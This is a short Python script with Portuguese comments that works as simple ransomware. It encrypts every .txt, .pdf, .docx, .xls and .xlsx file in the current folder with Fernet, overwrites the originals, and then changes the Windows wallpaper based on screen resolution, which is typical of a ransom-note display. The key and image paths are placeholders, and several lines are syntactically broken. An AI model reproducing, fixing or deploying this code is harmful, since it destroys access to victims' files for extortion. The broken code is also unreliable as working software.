from cryptography.fernet import Fernet
import os
import ctypes

key = #sua chave de criptografia


def Encrypt(file_name=None):
    Lock = Fernet(key)
    with open(file_name, 'rb') as file:
        data = file.read()
    protected = Lock.encrypt(data)
    with open(file_name, 'wb') as file:
        file.write(protected)


def Decrypt(file_name=None):
    Unlock = Fernet(key)
    with open(file_name, 'rb') as file:
        data = file.read()
      

    decoded = Unlock.decrypt(data)
    with open(file_name, 'wb') as file:
        file.write(decoded)


Raw_Files = os.listdir()
Files = list()

for File in Raw_Files():
    if File.endswith('.txt'):
        Files.append(File)

    if File.endswith('.pdf'):
        Files.append(File)

    if File.endswith('.docx'):
        Files.append(File)

    if File.endswith('.xls'):
        Files.append(File)

    if File.endswith('.xlsx'):
        Files.append(File)

function = Encrypt# #

for File in Files:
    function(File)


print("Execução completa")

#VAMOS DECLARAR AGORA UMA FUNC PRA IDENTIFICAR A RESOLUÇÃO DA TELA DO USUARIO


user32 = ctypes.windll.user32

screensize = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)

if screensize == (1920, 1080):
    WALLPAPER_PATH = #endereço das suas imagens

    ctypes.windll.user32.SystemParametersInfoW(20, 0, WALLPAPER_PATH, 3)

elif screensize == (1680, 1024):
    WALLPAPER_PATH = #endereço das suas imagens


    ctypes.windll.user32.SystemParametersInfoW(20, 0, WALLPAPER_PATH, 3)

elif screensize == (1600, 1024):
    WALLPAPER_PATH = #endereço das suas imagens


    ctypes.windll.user32.SystemParametersInfoW(20, 0, WALLPAPER_PATH, 3)

#--------------------------------------------------------------------------------

